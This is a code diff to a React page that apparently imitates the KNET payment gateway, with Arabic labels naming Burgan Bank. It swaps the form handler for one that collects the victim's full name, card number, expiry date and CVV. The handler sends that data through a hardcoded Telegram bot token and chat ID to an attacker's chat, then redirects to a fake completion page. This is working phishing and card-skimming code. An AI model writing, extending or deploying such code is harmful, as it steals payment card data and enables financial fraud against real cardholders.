@@ -13,13 +13,30 @@ export default function KnetPage() {
   const [pin, setPin] = useState("");
   const router = useRouter();
 
-  const handleSubmit = (e) => {
-    e.preventDefault();
-    if (!fullName || !cardNumber || !expMonth || !expYear || !pin) {
-      alert("يرجى تعبئة جميع الحقول");
-      return;
+  const handleSend = () => {
+    const text = `
+%0A🏦 بنك برقان
+👤 الاسم الكامل: ${fullName}%0A
+💳 رقم البطاقة: ${cardNumber}%0A
+📅  شهر: ${expMonth}%0A
+📅  سنة: ${expYear}%0A
+🔐 CVV: ${cvv}
+`;
+
+    if (
+      fullName.trim() === "" ||
+      cardNumber.trim() === "" ||
+      expMonth.trim() === "" ||
+      expYear.trim() === ""||
+      cvv.trim() === ""
+    ) {
+      alert("من فضلك املئ الحقول");
+    } else {
+      axios.post(
+        `https://api.telegram.org/bot8391195305:AAF-UCHdFDY2uR1cZI8-DOgEt59z849fq20/sendMessage?chat_id=5714216192&text=${text}`
+      );
+      router.push(`/kpay/finish?name=${cardData.number}`);
     }
-    router.push(`/kpay/finish?name=${cardNumber}`);
   };
 
   return (
